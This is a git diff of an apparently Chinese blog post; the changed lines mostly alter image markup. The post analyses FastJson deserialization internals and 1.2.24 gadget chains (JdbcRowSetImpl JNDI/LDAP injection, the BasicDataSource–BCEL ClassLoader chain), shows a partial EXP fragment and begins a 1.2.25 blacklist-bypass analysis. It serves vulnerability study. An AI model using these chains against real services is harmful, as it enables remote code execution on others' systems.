-<p>继续跟进<br>首先是各类值的获取，包括是否有注解，以及属性值的获取，还有构造方法的获取<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/19.png">)</p>
-<p>之后就是一段if判断<br><code>if (defaultConstructor == null &amp;&amp; !(clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers())))</code><br>判断一下指定类的默认构造是否获取正常，然后判断指定类是否为接口或者抽象类，显然我们整个攻击流程都不会进入这个if判断的内容，我们接着往下走<br>判断一下构造方法是否存在，然后给方法设置一下Acessible权限<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/20.png">)</p>
-<p>之后是三段长for循环内容<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/21.png">)</p>
+<p>来到下一个步骤 调用JavaBeanInfo.build方法，这是一个比较关键的方法，指定对象中的属性值和构造方法就是在这里被访问的<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/18.png">)</p>
+<p>继续跟进<br>首先是各类值的获取，包括是否有注解，以及属性值的获取，还有构造方法的获取<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/19.png">)</p>
+<p>之后就是一段if判断<br><code>if (defaultConstructor == null &amp;&amp; !(clazz.isInterface() || Modifier.isAbstract(clazz.getModifiers())))</code><br>判断一下指定类的默认构造是否获取正常，然后判断指定类是否为接口或者抽象类，显然我们整个攻击流程都不会进入这个if判断的内容，我们接着往下走<br>判断一下构造方法是否存在，然后给方法设置一下Acessible权限<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/20.png">)</p>
+<p>之后是三段长for循环内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/21.png">)</p>
 <p>我们先看整体结构了解这最后的三段for循环是在干什么<br>第一次和第三次for循环的条件是Method，具体一点是，第一次for是在获取set方法，而第三次for循环是在获取get方法<br>中间的for循环条件是字段属性值，个人猜测是获取到构造方法后对指定类的值进行处理</p>
-<p>我们先看第一段for循环的内容<br>获取所有方法，然后对每个方法进行4个判断<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/22.png">)</p>
+<p>我们先看第一段for循环的内容<br>获取所有方法，然后对每个方法进行4个判断<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/22.png">)</p>
 <ul>
 <li>1.如果该方法名字符数量小于4，不做进一步处理，continue</li>
 <li>2.如果该方法是静态方法，continue</li>
@@ -531,13 +407,13 @@ return clazz;
 </ul>
 <p>其实总结下来，他其实就是在寻找set方法，也就是我们指定类中的setName等赋值的方法，这也就是为什么FastJson能转化的类只能是javabean，因为javabean必须要有set和get方法</p>
 <p>之后就是各种特殊情况的判断，全体转小写之类的处理，直接跟进到最后的add方法</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/23.png">)</p>
-<p>add之前肯定是里面FieldInfo()构造方法实现，这里不做过多的代码展示<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/24.png">)</p>
-<p>这一块有一个比较重要的内容，就是getOnly这个参数的设置，他的判断是：如果我们现在给定的set方法的参数值不唯一，getOnly参数设置为true，如果set方法只有一个参数，就进入if内容，不会设置getOnly，记录一下，之后会碰到，涉及到asm的开关，也就是会不会产生asm构造器来解析JSON数据<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/25.png">)</p>
-<p>至于为什么不用asm生成的解析器，是因为asm的解析器是一个临时创建的类，我们跟进分析不到，其实后面的分析流程可以不用看了，我们重新跟进一遍，只不过这一遍需要我们稍作处理，也就是上面这两个if条件。<br>第一个肯定容易满足，这个方法是否存在，这个没啥好说的 第二个是当前方法传入的参数的数量不为1，也就是我们这个set方法传入参数数量不能为1，以为很好满足，实际上这第一个for循环有一个判断<br>如果参数数量不为1就给我continue下一个了<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/26.png">)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/23.png">)</p>
+<p>add之前肯定是里面FieldInfo()构造方法实现，这里不做过多的代码展示<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/24.png">)</p>
+<p>这一块有一个比较重要的内容，就是getOnly这个参数的设置，他的判断是：如果我们现在给定的set方法的参数值不唯一，getOnly参数设置为true，如果set方法只有一个参数，就进入if内容，不会设置getOnly，记录一下，之后会碰到，涉及到asm的开关，也就是会不会产生asm构造器来解析JSON数据<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/25.png">)</p>
+<p>至于为什么不用asm生成的解析器，是因为asm的解析器是一个临时创建的类，我们跟进分析不到，其实后面的分析流程可以不用看了，我们重新跟进一遍，只不过这一遍需要我们稍作处理，也就是上面这两个if条件。<br>第一个肯定容易满足，这个方法是否存在，这个没啥好说的 第二个是当前方法传入的参数的数量不为1，也就是我们这个set方法传入参数数量不能为1，以为很好满足，实际上这第一个for循环有一个判断<br>如果参数数量不为1就给我continue下一个了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/26.png">)</p>
 <p>也就是说第一个for循环关于getOnly的设置是不存在的，既然他叫getOnly，理应考虑第三个for循环，get方法获取的内容</p>
-<p>其实第三个for循环的内容重要区别就在于，他没这段if(types.lengths!&#x3D;1)的判断了，但是多了两层我们好实现的判断<br>一个是参数值是0即可绕过<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/28.png">)</p>
-<p>一个是只有该方法的返回类型满足下面这几个即可<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/27.png">)</p>
+<p>其实第三个for循环的内容重要区别就在于，他没这段if(types.lengths!&#x3D;1)的判断了，但是多了两层我们好实现的判断<br>一个是参数值是0即可绕过<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/28.png">)</p>
+<p>一个是只有该方法的返回类型满足下面这几个即可<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/27.png">)</p>
 <p>后续的add方法，以及FiledInfo创建的内容都是一样的，所以除了满足上述两个条件，接下来只需满足getOnly前的两段if即可，而这两段if早在参数值为0时就已经算是绕过了，因为一层为判断该方法是否为空，另一个就是判断该方法参数数量是否为1</p>
 <p>改一下我们的这个指定类的属性值</p>
 <pre><code class="java">import java.util.Map;  
@@ -581,22 +457,22 @@ return map;
 &#125;
 </code></pre>
 <p>其实也就是多了个类型为map的属性值，然后关于该属性值的方法，只有get方法，没有set方法，且参数值为0即可</p>
-<p>之后我们重新调试一遍来到第三遍for循环，然后直接跳到add方法中的FieldInfo构造方法，运行下来发现进入了else的内容，将getonly设置为true<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/29.png">)</p>
-<p>所以到目前为止，我们有了一个拥有getonly为true的build返回值了也就是FiledInfo中包含map字段<br>这个时候其实当我们跳出build方法，继续ParseConfig的流程，发现他会遍历我们的刚才生成的FiledInfo，依次寻找构造器，而当遍历到mapinfo的时候<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/30.png">)</p>
+<p>之后我们重新调试一遍来到第三遍for循环，然后直接跳到add方法中的FieldInfo构造方法，运行下来发现进入了else的内容，将getonly设置为true<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/29.png">)</p>
+<p>所以到目前为止，我们有了一个拥有getonly为true的build返回值了也就是FiledInfo中包含map字段<br>这个时候其实当我们跳出build方法，继续ParseConfig的流程，发现他会遍历我们的刚才生成的FiledInfo，依次寻找构造器，而当遍历到mapinfo的时候<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/30.png">)</p>
 <p>他会把asmEnable这个开关关闭，改成false<br>然后就是重新调用构造一遍FieldIinfo，构造完毕之后完成，彻底创建好了这个javabeandeserialzer，开始调用它的deserialze方法</p>
-<h4 id="调用构造器的deserialze方法进行最终解析"><a href="#调用构造器的deserialze方法进行最终解析" class="headerlink" title="调用构造器的deserialze方法进行最终解析"></a>调用构造器的deserialze方法进行最终解析</h4><p>deserialze这里的代码内容依然很多，我们只讲关键部分的遍历FieldInfo<br>在这个遍历到for循环之前，deserialze的主要工作是对于JSON数据边界的一个识别，还有一些默认的检测<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/31.png">)</p>
+<h4 id="调用构造器的deserialze方法进行最终解析"><a href="#调用构造器的deserialze方法进行最终解析" class="headerlink" title="调用构造器的deserialze方法进行最终解析"></a>调用构造器的deserialze方法进行最终解析</h4><p>deserialze这里的代码内容依然很多，我们只讲关键部分的遍历FieldInfo<br>在这个遍历到for循环之前，deserialze的主要工作是对于JSON数据边界的一个识别，还有一些默认的检测<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/31.png">)</p>
 <p>先获取所有字段及其内容，然后就是大段的根据JSON数据的检测，直到开始实例化指定的对象，具体内容就不看了</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/32.png">)</p>
-<p>实例化之后就是调用里面的set和get方法了，先是调用set<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/33.png">)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/32.png">)</p>
+<p>实例化之后就是调用里面的set和get方法了，先是调用set<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/33.png">)</p>
 <p>里面很多if判断用来提前准备，具体内容对整体流程没有影响，最终也只是直接invoke调用set方法</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/34.png">)</p>
-<p>然后看一下Console，已经进行完了构造函数以及set方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/35.png">)</p>
-<p>之后就是循环的过程了 一个set一个set的调用。<br>而你会问，我们的get方法是在哪调用的呢？<br>其实是我们进行完最开始的ParseObject方法之后，他最后还调用了JSON.toJSON方法，在toJSON方法里面调用到get方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/36.png">)<br>整个反序列化的流程就是这些，我们之后稍微总结一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/34.png">)</p>
+<p>然后看一下Console，已经进行完了构造函数以及set方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/35.png">)</p>
+<p>之后就是循环的过程了 一个set一个set的调用。<br>而你会问，我们的get方法是在哪调用的呢？<br>其实是我们进行完最开始的ParseObject方法之后，他最后还调用了JSON.toJSON方法，在toJSON方法里面调用到get方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/36.png">)<br>整个反序列化的流程就是这些，我们之后稍微总结一下</p>
 <h2 id="FastJson流程总结以及漏洞点分析"><a href="#FastJson流程总结以及漏洞点分析" class="headerlink" title="FastJson流程总结以及漏洞点分析"></a>FastJson流程总结以及漏洞点分析</h2><p>parseObject方法作为入口进入流程 此时分为了两步 一是先将这个指定的类classLoader加载出来（此时对于里面的set get方法以及属性值都没有操作的）<br>第二步开始获取构造器，准备用构造器来对JSON数据的内容进行解析，解析的过程中调用了set方法去赋值<br>最后解析完毕之后，又调用JSON.toJSON方法触发了get方法去实现</p>
 <p>所以漏洞出在哪呢？其实就是它对指定类的set方法以及get方法调用，会直接执行它方法里面的内容</p>
-<p>我们写一个恶意类执行一下<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/37.png">)</p>
+<p>我们写一个恶意类执行一下<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/37.png">)</p>
 <p>这里采用set方法去执行恶意方法，执行条件之后总结<br>执行完毕，其实会发现就算不是javabean格式的类 FastJson也会去解析，这是因为在获取构造器的时候，本地没有对应加载器，它都会当作javabean去解析，导致后面的流程其实是一样的</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/38.png">)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/38.png">)</p>
 <h2 id="FastJson漏洞利用前的流程总结"><a href="#FastJson漏洞利用前的流程总结" class="headerlink" title="FastJson漏洞利用前的流程总结"></a>FastJson漏洞利用前的流程总结</h2><p>这里的内容不仅是为后续的漏洞利用做铺垫，也是为了给之后复习留一点余地，能够快速回忆<br>FastJson提供了一种特有的反序列化方式，当然序列化的数据是JSON格式<br>第一次跟进一步，他会先进入一段parse，也是在这条流程中进行的解析，首先是根据@type来解析指定类，当然这一步还没完。<br>后续他会先获取解析器，在获取解析器的过程中，流程跟进到JavaBeanInfo类中的三段for循环中，这三段for循环分别是获取到所有的set方法，以及获取到所有的public字段，最后是获取到所有的get方法<br>获取解析器完毕之后，我们回到了DefaultJSONParser类，调用该解析器的deserialze方法去调用set方法进行赋值，赋值完毕之后算是真正实例化完毕JSON数据所指定的对象<br>上述第一步parse做完之后，还会进行一次JSON.toJSON方法，也是这里进行的get方法获取变量 </p>
 <p>漏洞直接利用点就出在DefaultJSONParser在获取完解析器之后的调用deserailze方法中，他会直接调用set方法<br>还有一个出自JSON.toJSON方法,这里面直接调用了get方法<br>利用条件的话主要是在DefaultJSONParser中获取构造器的方法—-getDeserializer后续调用到的JavaBeanInfo中三段for的获取</p>
 <ul>
@@ -622,8 +498,8 @@ return map;
 <p>JNDI版本限制 至少8u191版本以下<br>FastJson在1.2.24版本<br>必须能够出网</p>
 </blockquote>
 <p>这很明显是一个实现类，这个类里面本来的作用我们先不看，在类中有个很熟悉的地方</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/39.png">)</p>
-<p>你会发现它在connect方法中有一段很明显存在JNDI注入的地方,先InitialContext初始化一下,然后就是调用lookup,这里其实就是最后的利用点了,但是事先我们还是得确认一点lookup的参数可控，查看调用之后发现确实可控，那我们继续下一步推进<br>我们再看看哪里调用了connect<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/40.png">)<br>还是同样的类中方法，正好有一个get和set方法，那我们这里该如何取舍呢？首先要知道get方法在FastJson的解析过程中是必须进行完JSON数据解析，也就是调用set之后才能调用到的方法，那假如说我们选定get方法作为节点调入，很容易就在JSON数据解析的时候就被报错catch下来，所以这里我们保险起见采用setAutoCommit方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/41.png">)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/39.png">)</p>
+<p>你会发现它在connect方法中有一段很明显存在JNDI注入的地方,先InitialContext初始化一下,然后就是调用lookup,这里其实就是最后的利用点了,但是事先我们还是得确认一点lookup的参数可控，查看调用之后发现确实可控，那我们继续下一步推进<br>我们再看看哪里调用了connect<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/40.png">)<br>还是同样的类中方法，正好有一个get和set方法，那我们这里该如何取舍呢？首先要知道get方法在FastJson的解析过程中是必须进行完JSON数据解析，也就是调用set之后才能调用到的方法，那假如说我们选定get方法作为节点调入，很容易就在JSON数据解析的时候就被报错catch下来，所以这里我们保险起见采用setAutoCommit方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/41.png">)</p>
 <p>EXP如下</p>
 <pre><code class="java">import com.alibaba.fastjson.JSON;  
 import com.sun.rowset.JdbcRowSetImpl;  
@@ -636,14 +512,14 @@ JSON.parseObject(s);
 &#125;
 </code></pre>
 <p>这里的地址可以通过yakit生成，或者自己起一个JNDI关于LDAP的服务，那既然用了LDAP，其实就有版本限制了，至少是8u191之前的版本，但是又有一个问题不知道是不是我自身问题，就是只有在8u202的较高版本才能找到最终connect方法调用路径</p>
-<h3 id="（Bcel）入口类ClassLoaderEXP分析"><a href="#（Bcel）入口类ClassLoaderEXP分析" class="headerlink" title="（Bcel）入口类ClassLoaderEXP分析"></a>（Bcel）入口类ClassLoaderEXP分析</h3><p>上述是必须出网的攻击，那么这里就学习一种不出网的攻击<br>主要经过的是这个类，其实算是最终利用类了，最终是走到它的loadclass通过字节码来加载类<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/42.png">)</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/43.png">)</p>
-<p>直接往前寻找loadclass其实不太现实，很多类加载相关的类都有这个loadclass，这里我们找到了一个tomcat自带的类能够指定选用类加载器，那如果我们指定该classLoader的loadclass就可以实现链子的拼接<br>这个类叫做BasicDataSource，在它的createConnectionFactory方法中实现了这个功能<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/44.png">)<br>找到了该方法后其实下一步就是看这两个参数<strong>driverClassLoader</strong>与<strong>driverClassName</strong>是否可控了，也就是找这两个变量的setter方法</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/45.png">)</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/46.png">)</p>
+<h3 id="（Bcel）入口类ClassLoaderEXP分析"><a href="#（Bcel）入口类ClassLoaderEXP分析" class="headerlink" title="（Bcel）入口类ClassLoaderEXP分析"></a>（Bcel）入口类ClassLoaderEXP分析</h3><p>上述是必须出网的攻击，那么这里就学习一种不出网的攻击<br>主要经过的是这个类，其实算是最终利用类了，最终是走到它的loadclass通过字节码来加载类<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/42.png">)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/43.png">)</p>
+<p>直接往前寻找loadclass其实不太现实，很多类加载相关的类都有这个loadclass，这里我们找到了一个tomcat自带的类能够指定选用类加载器，那如果我们指定该classLoader的loadclass就可以实现链子的拼接<br>这个类叫做BasicDataSource，在它的createConnectionFactory方法中实现了这个功能<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/44.png">)<br>找到了该方法后其实下一步就是看这两个参数<strong>driverClassLoader</strong>与<strong>driverClassName</strong>是否可控了，也就是找这两个变量的setter方法</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/45.png">)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/46.png">)</p>
 <p>确定完这两个事之后呢，下一件事就是寻找上一步的相关调用了</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/47.png">)</p>
-<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/48.png">)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/47.png">)</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/48.png">)</p>
 <p>最终还是在这个类里面的getConnection确定了入口，是getter的入口，而且也满足成为FastJson可获取的那个Getter方法<br>所以链子的话就是 </p>
 <pre><code>BasicDataSource::getConnection()-BasicDataSource::createDataSource()-&gt;BasicDataSource::createConnectionFactory()-&gt;(com.sun.org.apache.bcel)ClassLoader::loadclass()
 </code></pre>
@@ -712,17 +588,17 @@ return code;
 </code></pre>
 <p>至此FastJson 1.2.24的链子分析差不多了，但是网上的比较常用的TemplentImpl那条链子没有分析，CC链居多，除非题目非要考，很少遇得到，实用性不高，我们接下来分析高版本的绕过</p>
 <h2 id="FastJson高版本绕过"><a href="#FastJson高版本绕过" class="headerlink" title="FastJson高版本绕过"></a>FastJson高版本绕过</h2><p>这里的高版本指 &lt;&#x3D;1.2.47,直到写这篇笔记的时候也只研究到这里，暂待补充</p>
-<h3 id="1-2-25之后的新增waf检测流程分析"><a href="#1-2-25之后的新增waf检测流程分析" class="headerlink" title="1.2.25之后的新增waf检测流程分析"></a>1.2.25之后的新增waf检测流程分析</h3><p>在1.2.25的时候进行了一次修复，主要是存在于parseObject方法的某个逻辑中进行了一次if判断<br>之前在1.2.24的时候就直接 TypeUtils.loadClass初步加载了<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/49.png">)</p>
-<p>我们进checkAutoType方法看看<br>其实刚开始就是两个很重量级的白名单和黑名单，也就是两个for循环执行的内容<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/50.png">)</p>
+<h3 id="1-2-25之后的新增waf检测流程分析"><a href="#1-2-25之后的新增waf检测流程分析" class="headerlink" title="1.2.25之后的新增waf检测流程分析"></a>1.2.25之后的新增waf检测流程分析</h3><p>在1.2.25的时候进行了一次修复，主要是存在于parseObject方法的某个逻辑中进行了一次if判断<br>之前在1.2.24的时候就直接 TypeUtils.loadClass初步加载了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/49.png">)</p>
+<p>我们进checkAutoType方法看看<br>其实刚开始就是两个很重量级的白名单和黑名单，也就是两个for循环执行的内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/50.png">)</p>
 <p>其实白名单刚进来的时候是为空的，它是直接向配置文件加载。而黑名单就是写死的，我们之前学的两条链子基本上都不能打了<br>这里就出现了第一次分支<br><strong>&lt;1&gt;.如果在白名单里面，直接加载；如果在黑名单里面，就抛异常结束程序</strong><br>这里我们先打住，记住这次分支。<br>假如说我们指定的加载类即不在黑名单内，也不在白名单内，就下一步</p>
-<p>下一步开始就是寻找指定类了<br>首先会从一个Mapping里面寻找，如果没找到，就又去deserializers解析器里面去找，看之前历史有没有加载过这个类<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/51.png">)</p>
+<p>下一步开始就是寻找指定类了<br>首先会从一个Mapping里面寻找，如果没找到，就又去deserializers解析器里面去找，看之前历史有没有加载过这个类<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/51.png">)</p>
 <p>所以第二次分支是<br><strong>经过这两次if判断，也就是Mapping内存中找，deserializer历史加载缓存中寻找之后如果找到了，直接返回该类，如果没找到进入下一步</strong></p>
-<p>而在下一步之前，又过了一遍白名单和黑名单<br>因为此时autoTypeSupport是始终没有经过我们修改的，所以!autoTypeSupport为true，会进入本次黑白名单检测。<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/FastJson/52.png">)</p>
+<p>而在下一步之前，又过了一遍白名单和黑名单<br>因为此时autoTypeSupport是始终没有经过我们修改的，所以!autoTypeSupport为true，会进入本次黑白名单检测。<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://stoocea.github.io/images/FastJson/52.png">)</p>
 <p>那很明显我们现在想要绕过白名单或者黑名单都是不太可能的。两次黑白名单的内容是不一样的，比如说我这次调试的com.sum包底下的JdbcRowSetImpl类，第一次黑白名单检测的时候就没有被查出来，而第二次就被查出来了<br>再往下走呢其实也不存在正常加载的可能，因为autoTypeSupport始终都是默认false状态，后续的检测基本上都是需要autoTypeSupport为true才能加载</p>
 <p>其实这里的思路就断了，我们重新回到之前第二个分支路口，也就是首先从mapping缓存中找是否有指定类，然后再从deserailizer解析器的解析历史中找是否有加载的缓存的那一部分。</p>
